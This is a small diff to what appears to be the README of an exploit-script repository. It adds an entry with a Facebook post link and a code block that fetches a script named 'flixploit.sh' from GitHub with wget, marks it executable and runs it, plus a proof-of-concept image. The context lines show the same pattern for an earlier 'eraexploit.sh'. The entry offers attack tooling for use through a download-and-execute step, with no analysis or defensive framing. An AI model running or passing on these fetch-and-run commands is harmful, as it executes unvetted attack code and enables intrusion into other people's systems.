@@ -58,3 +58,14 @@ chmod +x eraexploit.sh
 ### Proof of Concept
 <img src="https://raw.githubusercontent.com/1337r0j4n/privuln/main/earexploit-poc.png">
 
+---
+
+- https://web.facebook.com/maing.phtml/posts/pfbid02um3uk7LZnwmjSNsAWnNhxUaVEgm1WJa61dymvqV2eu6fRbtXfrcUe2ywoG4ygB8Bl
+
+```
+wget https://raw.githubusercontent.com/1337r0j4n/privuln/main/flixploit.sh
+chmod +x flixploit.sh
+./flixploit.sh
+```
+### Proof of Concept
+<img src="https://raw.githubusercontent.com/1337r0j4n/privuln/main/flixploit-poc.png">
